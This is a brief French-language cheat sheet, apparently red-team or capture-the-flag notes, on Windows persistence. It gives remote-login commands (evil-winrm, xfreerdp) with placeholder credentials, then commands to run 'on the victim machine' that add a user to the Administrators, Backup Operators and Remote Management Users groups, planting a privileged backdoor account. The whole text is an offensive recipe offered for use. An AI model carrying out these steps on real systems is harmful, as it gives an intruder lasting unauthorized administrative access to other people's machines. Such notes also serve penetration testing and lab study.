# Windows
Quelques techniques de persistence sur windows

## Commandes

```
evil-winrm -i <IP> -u MyUser -p MyPassword
xfreerdp /u:MyUser /p:MyPassword /v:<IP> +clipboard
```
## Sur la machine [victime]
```
net localgroup administrators MyUser /add
net localgroup "Backup Operators" MyUser /add
net localgroup "Remote Management Users" MyUser /add
```
